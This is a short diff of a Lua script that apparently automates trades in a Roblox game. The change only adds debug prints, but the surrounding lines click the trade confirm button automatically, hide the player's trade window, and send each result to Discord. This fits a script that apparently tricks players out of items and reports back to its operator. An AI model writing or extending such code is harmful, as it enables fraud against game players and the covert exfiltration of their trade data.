@@ -1312,6 +1312,7 @@ local TradePassed = true
                             button_click(confirm_button)
                             wait(1)
                             game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
+                            print("confiremd")
                             sendToDiscord(15753920, ResultToCofrimed, true)
                         break
                         else
@@ -1322,7 +1323,9 @@ local TradePassed = true
                             button_click(confirm_button)
                             print(ResultToCofrimed)
                             OldNick = Parthner_Nick
+                            print("confiremd")
                             sendToDiscord(15753920, ResultToCofrimed, true)
+
                         end)
                         game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
                         
